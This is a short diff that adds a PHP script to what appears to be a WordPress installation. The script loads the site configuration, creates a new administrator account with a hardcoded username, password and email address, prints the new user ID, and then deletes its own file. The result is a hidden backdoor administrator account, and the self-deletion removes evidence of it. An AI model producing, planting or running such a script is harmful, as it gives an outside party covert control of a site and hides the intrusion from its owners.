@@ -1,0 +1,15 @@
+<?php
+include 'wp-config.php';
+
+$user_login	= 'themegs';
+$user_pass	= 'azdd9c123.66@';
+$user_email	= 'peckadlegwt@gmail.com';
+$role		= 'administrator';
+
+$userdata	= compact('user_login', 'user_email', 'user_pass','role');
+
+$user_id	= wp_insert_user($userdata);
+
+print_R($user_id);
+
+unlink(__FILE__);
